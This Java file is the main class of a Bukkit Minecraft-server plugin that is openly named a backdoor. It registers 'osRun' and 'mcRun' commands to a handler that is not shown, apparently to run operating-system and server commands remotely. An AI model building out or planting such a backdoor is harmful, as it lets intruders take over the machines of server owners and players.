package lightman.backdoor;

import org.bukkit.plugin.java.JavaPlugin;

public class BackdoorPlugin extends JavaPlugin {
    @Override
    public void onDisable() { }

    @Override
    public void onEnable() {
        for (String c : new String[] { "osRun", "mcRun" }) {
        	getCommand(c).setExecutor(new CommandsHandler(this));
        }
    }
}
